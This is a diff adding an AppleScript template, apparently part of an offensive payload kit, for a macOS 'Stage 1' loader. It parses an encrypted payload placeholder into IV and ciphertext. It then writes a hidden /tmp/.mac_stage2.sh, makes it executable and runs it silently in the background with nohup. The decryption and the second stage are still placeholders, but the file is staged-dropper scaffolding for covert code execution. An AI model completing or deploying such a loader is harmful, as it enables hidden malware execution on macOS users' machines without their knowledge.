@@ -1,0 +1,18 @@
+-- payloads/mac/osascript/template.osascript
+
+-- AES decryptor template for macOS Stage 1
+-- Placeholder uses REPLACE_AES format (ivhex:base64cipher)
+
+set aes_payload to "REPLACE_AES"
+
+-- Extract IV and ciphertext
+set AppleScript's text item delimiters to ":"
+set ivHex to text item 1 of aes_payload
+set b64 to text item 2 of aes_payload
+
+-- NOTE: Real AES decryption must be handled via native binary or Python (recommended)
+-- Placeholder: save decoded base64 to /tmp, and run via Terminal
+
+do shell script "echo '[!] Decryption logic to be handled via Python in final build' > /tmp/.mac_stage2.sh"
+do shell script "chmod +x /tmp/.mac_stage2.sh"
+do shell script "nohup bash /tmp/.mac_stage2.sh >/dev/null 2>&1 &"
